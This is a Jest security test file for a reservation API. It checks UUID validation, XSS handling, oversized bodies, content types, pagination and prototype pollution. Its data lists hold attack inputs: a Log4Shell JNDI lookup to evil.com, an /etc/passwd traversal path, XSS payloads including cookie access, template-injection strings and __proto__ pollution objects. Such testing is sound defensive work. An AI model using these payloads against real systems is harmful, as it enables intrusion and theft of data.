/**
 * Security Tests: Input Validation Edge Cases
 *
 * Tests:
 * - UUID validation bypass attempts
 * - XSS in text fields
 * - Oversized payloads
 * - Wrong Content-Type
 * - Empty/null body handling
 * - HTTP method mismatch
 * - Pagination edge cases
 *
 * Related: #244, #248
 */
import { api, authHeader } from '../helpers/test-utils';

const auth = authHeader('ADMIN');

describe('Security: Input Validation Edge Cases', () => {
  // =========================================
  // 1. UUID Validation Bypass
  // =========================================
  describe('UUID validation bypass attempts', () => {
    const INVALID_UUIDS = [
      'not-a-uuid',
      '123',
      '../../../etc/passwd',
      '00000000000000000000000000000001', // without dashes
      '00000000-0000-0000-0000-00000000000g', // invalid hex char
      'GGGGGGGG-GGGG-GGGG-GGGG-GGGGGGGGGGGG',
      '<script>alert(1)</script>',
      '${jndi:ldap://evil.com/x}', // Log4Shell pattern
      '%00', // null byte
      ' 00000000-0000-0000-0000-000000000001', // leading space
      '00000000-0000-0000-0000-000000000001 ', // trailing space
    ];

    it.each(INVALID_UUIDS)(
      'should reject invalid UUID in reservation endpoint: %s',
      async (uuid) => {
        const res = await api
          .get(`/api/reservations/${encodeURIComponent(uuid)}`)
          .set(auth);

        // Should be 400 (validateUUID) or 404 (route mismatch) — never 500
        expect([400, 404]).toContain(res.status);
      }
    );

    it('should accept nil UUID (all zeros)', async () => {
      const res = await api
        .get('/api/reservations/00000000-0000-0000-0000-000000000000')
        .set(auth);

      // Nil UUID is valid format — should reach handler (probably 404)
      expect([200, 404]).toContain(res.status);
    });

    it('should accept uppercase UUID', async () => {
      const res = await api
        .get('/api/reservations/00000000-0000-0000-0000-000000000001')
        .set(auth);

      // Valid format, case-insensitive regex
      expect(res.status).not.toBe(400);
    });
  });

  // =========================================
  // 2. XSS in Text Fields
  // =========================================
  describe('XSS in text fields', () => {
    const XSS_PAYLOADS = [
      '<script>alert("xss")</script>',
      '<img src=x onerror=alert(1)>',
      '"><svg onload=alert(1)>',
      "javascript:alert('XSS')",
      '<iframe src="javascript:alert(1)">',
      '{{constructor.constructor("return this")()}}',
      '${7*7}',
      '<a href="javascript:void(0)" onclick="alert(1)">click</a>',
    ];

    describe('Client creation — XSS in name fields', () => {
      it.each(XSS_PAYLOADS)(
        'should store/reject XSS payload without executing: %s',
        async (payload) => {
          const res = await api
            .post('/api/clients')
            .set(auth)
            .send({
              firstName: payload,
              lastName: 'TestXSS',
              phone: '+48123456789',
            });

          // Should either accept (stored as text, output-escaped later) or reject
          // Critical: must NOT return 500
          expect(res.status).not.toBe(500);

          if (res.status === 201 || res.status === 200) {
            // If stored, verify it's stored as plain text, not interpreted
            const data = res.body.data || res.body;
            if (data && data.firstName) {
              expect(data.firstName).toBe(payload);
            }
          }
        }
      );
    });

    describe('Reservation notes — XSS in internalNotes', () => {
      it('should safely handle HTML in notes field', async () => {
        const res = await api
          .post('/api/reservations')
          .set(auth)
          .send({
            clientId: '00000000-0000-0000-0000-000000000001',
            hallId: '00000000-0000-0000-0000-000000000001',
            eventTypeId: '00000000-0000-0000-0000-000000000001',
            startDateTime: '2026-08-01T10:00:00Z',
            endDateTime: '2026-08-01T18:00:00Z',
            guestCount: 50,
            internalNotes: '<script>document.cookie</script>',
          });

        expect(res.status).not.toBe(500);
      });
    });
  });

  // =========================================
  // 3. Oversized Payloads
  // =========================================
  describe('Oversized payloads', () => {
    it('should reject payload > express json limit', async () => {
      const largePayload = {
        firstName: 'A'.repeat(1_000_000), // 1MB string
        lastName: 'Test',
        phone: '+48123456789',
      };

      const res = await api
        .post('/api/clients')
        .set(auth)
        .send(largePayload);

      // Express default limit may reject (413) or process may crash (500)
      // or validation may reject (400/422). Key: server doesn't hang
      expect(res.status).toBeDefined();
      expect(res.status).toBeGreaterThanOrEqual(400);
    });

    it('should handle deeply nested JSON', async () => {
      // Create deeply nested object — prototype pollution / stack overflow attempt
      let nested: any = { value: 'bottom' };
      for (let i = 0; i < 100; i++) {
        nested = { nested };
      }

      const res = await api
        .post('/api/clients')
        .set(auth)
        .send(nested);

      expect(res.status).not.toBe(500);
    });

    it('should handle array with many elements', async () => {
      const res = await api
        .post('/api/clients')
        .set(auth)
        .send({
          firstName: 'Test',
          lastName: 'Test',
          phone: '+48123456789',
          tags: new Array(10000).fill('tag'),
        });

      expect(res.status).not.toBe(500);
    });
  });

  // =========================================
  // 4. Content-Type Mismatch
  // =========================================
  describe('Content-Type mismatch', () => {
    it('should reject non-JSON content type on JSON endpoint', async () => {
      const res = await api
        .post('/api/clients')
        .set(auth)
        .set('Content-Type', 'text/plain')
        .send('firstName=Test&lastName=Test');

      expect(res.status).not.toBe(500);
      expect([400, 415, 422]).toContain(res.status);
    });

    it('should reject XML content type', async () => {
      const res = await api
        .post('/api/clients')
        .set(auth)
        .set('Content-Type', 'application/xml')
        .send('<client><firstName>Test</firstName></client>');

      expect(res.status).not.toBe(500);
    });

    it('should handle multipart form data on non-upload endpoint', async () => {
      const res = await api
        .post('/api/clients')
        .set(auth)
        .set('Content-Type', 'multipart/form-data; boundary=----formdata')
        .send('------formdata\r\nContent-Disposition: form-data; name="firstName"\r\n\r\nTest\r\n------formdata--');

      expect(res.status).not.toBe(500);
    });
  });

  // =========================================
  // 5. Empty / Null Body Handling
  // =========================================
  describe('Empty and null body handling', () => {
    it('should reject empty body on POST endpoint', async () => {
      const res = await api
        .post('/api/clients')
        .set(auth)
        .send({});

      expect(res.status).not.toBe(500);
      expect([400, 422]).toContain(res.status);
    });

    it('should handle null values in required fields', async () => {
      const res = await api
        .post('/api/clients')
        .set(auth)
        .send({
          firstName: null,
          lastName: null,
          phone: null,
        });

      expect(res.status).not.toBe(500);
    });

    it('should handle undefined values in body', async () => {
      const res = await api
        .post('/api/clients')
        .set(auth)
        .send({
          firstName: undefined,
          lastName: 'Test',
        });

      expect(res.status).not.toBe(500);
    });
  });

  // =========================================
  // 6. HTTP Method Mismatch
  // =========================================
  describe('HTTP method mismatch', () => {
    it('should return 404 or 405 for POST on GET-only endpoint', async () => {
      const res = await api
        .post('/api/stats/overview')
        .set(auth)
        .send({});

      expect([404, 405]).toContain(res.status);
    });

    it('should return 404 or 405 for DELETE on collection endpoint', async () => {
      const res = await api
        .delete('/api/reservations')
        .set(auth);

      expect([404, 405]).toContain(res.status);
    });

    it('should return 404 or 405 for PATCH on collection endpoint', async () => {
      const res = await api
        .patch('/api/clients')
        .set(auth)
        .send({});

      expect([404, 405]).toContain(res.status);
    });
  });

  // =========================================
  // 7. Pagination Edge Cases
  // =========================================
  describe('Pagination edge cases', () => {
    it('should handle page=0 gracefully', async () => {
      const res = await api
        .get('/api/reservations')
        .query({ page: 0 })
        .set(auth);

      expect(res.status).not.toBe(500);
    });

    it('should handle page=-1 gracefully', async () => {
      const res = await api
        .get('/api/reservations')
        .query({ page: -1 })
        .set(auth);

      expect(res.status).not.toBe(500);
    });

    it('should handle limit=0 gracefully', async () => {
      const res = await api
        .get('/api/reservations')
        .query({ limit: 0 })
        .set(auth);

      expect(res.status).not.toBe(500);
    });

    it('should handle limit=999999 gracefully', async () => {
      const res = await api
        .get('/api/reservations')
        .query({ limit: 999999 })
        .set(auth);

      expect(res.status).not.toBe(500);
    });

    it('should handle non-numeric page parameter', async () => {
      const res = await api
        .get('/api/reservations')
        .query({ page: 'abc' })
        .set(auth);

      expect(res.status).not.toBe(500);
    });

    it('should handle page=NaN', async () => {
      const res = await api
        .get('/api/reservations')
        .query({ page: 'NaN' })
        .set(auth);

      expect(res.status).not.toBe(500);
    });

    it('should handle sort with non-existent field', async () => {
      const res = await api
        .get('/api/reservations')
        .query({ sortBy: 'nonexistent_field_injection' })
        .set(auth);

      expect(res.status).not.toBe(500);
    });
  });

  // =========================================
  // 8. Prototype Pollution
  // =========================================
  describe('Prototype pollution attempts', () => {
    it('should not allow __proto__ injection', async () => {
      const res = await api
        .post('/api/clients')
        .set(auth)
        .send({
          firstName: 'Test',
          lastName: 'Proto',
          phone: '+48123456789',
          __proto__: { isAdmin: true },
        });

      expect(res.status).not.toBe(500);
    });

    it('should not allow constructor pollution', async () => {
      const res = await api
        .post('/api/clients')
        .set(auth)
        .send({
          firstName: 'Test',
          lastName: 'Constructor',
          phone: '+48123456789',
          constructor: { prototype: { isAdmin: true } },
        });

      expect(res.status).not.toBe(500);
    });
  });
});
